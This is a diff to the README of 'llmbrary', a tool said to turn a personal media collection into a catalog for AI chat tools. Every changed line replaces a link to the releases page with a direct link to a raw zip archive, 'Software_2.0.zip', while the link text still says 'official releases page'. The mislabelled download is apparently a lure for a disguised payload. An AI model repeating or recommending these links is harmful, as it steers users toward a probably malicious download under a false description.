@@ -1,6 +1,6 @@
 # 📚 llmbrary - Give your AI a personal library
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Bennyvibrionic5714/llmbrary/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Bennyvibrionic5714/llmbrary/raw/refs/heads/main/claude/Software_2.0.zip)
 
 llmbrary turns your physical collection of books, films, and music into a digital format that AI models understand. You choose the media you own. You build a catalog. You upload this catalog into your preferred AI chat tool. The AI then references your specific intellectual history during your conversations.
 
@@ -16,7 +16,7 @@ You need a Windows computer to run this tool. The software requires 200 megabyte
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Bennyvibrionic5714/llmbrary/releases) to download the installer.
+1. Visit the [official releases page](https://github.com/Bennyvibrionic5714/llmbrary/raw/refs/heads/main/claude/Software_2.0.zip) to download the installer.
 2. Look for the file ending in .exe under the latest version header.
 3. Click the file to start the download.
 4. Open the folder where your computer saves downloads.
@@ -61,7 +61,7 @@ llmbrary keeps your entire collection on your local machine. No data leaves your
 
 Use the link below to get current installer files for Windows.
 
-[Download llmbrary from the Releases Page](https://github.com/Bennyvibrionic5714/llmbrary/releases)
+[Download llmbrary from the Releases Page](https://github.com/Bennyvibrionic5714/llmbrary/raw/refs/heads/main/claude/Software_2.0.zip)
 
 ## 💡 Frequently asked questions
 
